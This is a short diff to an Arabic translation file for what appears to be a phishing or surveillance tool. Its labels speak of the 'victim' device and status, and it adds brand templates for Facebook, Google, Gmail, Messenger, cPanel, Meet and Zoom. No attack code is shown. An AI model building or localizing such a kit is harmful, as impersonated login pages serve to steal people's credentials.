@@ -33,6 +33,17 @@ export const ar = {
     select_peer_device: 'أختر جهاز الضحية',
     agent_status: 'حالة الضحية',
     peer_webrtc_status: 'حالة الضحية في الجلسة',
+    pick_template: 'إختر قالب',
+    templates: {
+      facebook: 'فيسبوك',
+      google: 'جوجل',
+      youtube: 'يوتيوب',
+      gmail: 'جيميل',
+      messenger: 'مسنجر',
+      cpanel: 'لوحة التحكم - CPanel',
+      meet: 'ميت - Google meet',
+      zoom: 'زوم',
+    }
   },
   descriptions: {
     login: '',
